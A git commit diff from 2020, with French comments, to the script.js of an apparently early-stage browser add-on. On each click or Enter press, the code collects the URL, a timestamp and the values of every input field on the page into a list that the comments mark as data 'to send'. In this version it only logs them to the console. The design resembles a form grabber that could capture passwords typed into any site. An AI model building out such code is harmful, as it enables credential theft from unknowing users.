d6ac72fbf7c686e3d45388231dd01eb1828c2465
mathis <petitcroco13@gmail.com>
2020-05-25 19:13:14 +0200

    base des recuperations d'input

--- script.js
+++ script.js
@@ -1,23 +1,24 @@
 "use strict";
 
-console.log('demarrage de mon addon');
-
 /*************************************************************/
 /*            DE 1001->1010 variables temporaires            */
 /* clef1000 = liste de tout les input                        */
 /* clef1001 = compteur temporaire                            */
 /* clef1002 = site visité                                    */
-/* clef1003 = liste avec les values des input                                      */
+/* clef1003 = liste avec les values des input                */
+/* clef1004 = objet Date()                                   */
 /*             DE 1011->1021 variables à envoyer             */
-/* clef1011 = liste avec toutes les info à envoyer                                              */
-/* clef1011 = [[site visité],[tous les input de la page]]                                               */
+/* clef1011 = liste avec toutes les info à envoyer           */
+/* clef1011 = [[site visité],[tous les input de la page]]    */
 /* clef1007 =                                                */
 /* clef1008 =                                                */
 /* clef1009 =                                                */
 /*************************************************************/
 
-document.addEventListener('click', function(event){
-	event.preventDefault;
+document.addEventListener('click', funct1000);
+document.addEventListener("keydown", funct1001);
+
+function funct1000(){
 	var clef1002 = document.location.href;
 	var clef1003 = [];
 	var clef1000 = Array.prototype.slice.call(document.getElementsByTagName('input'),0)
@@ -26,7 +27,15 @@ document.addEventListener('click', function(event){
 			clef1003.push(clef1000[clef1001].value);
 		}
 	}
-	var clef1011 = [clef1002];
+	const clef1004 = new Date();
+	var clef1011 = [clef1004.getDate()+"/"+(clef1004.getMonth()+1)+"/"+(clef1004.getYear()+1900)+" | "+clef1004.getHours()+":"+clef1004.getMinutes()];
+	clef1011.push(clef1002);
 	clef1011.push(clef1003);
 	console.log(clef1011);
-});
+}
+
+function funct1001(event){
+	if (event.keyCode == 13){
+    	funct1000()
+  }
+}
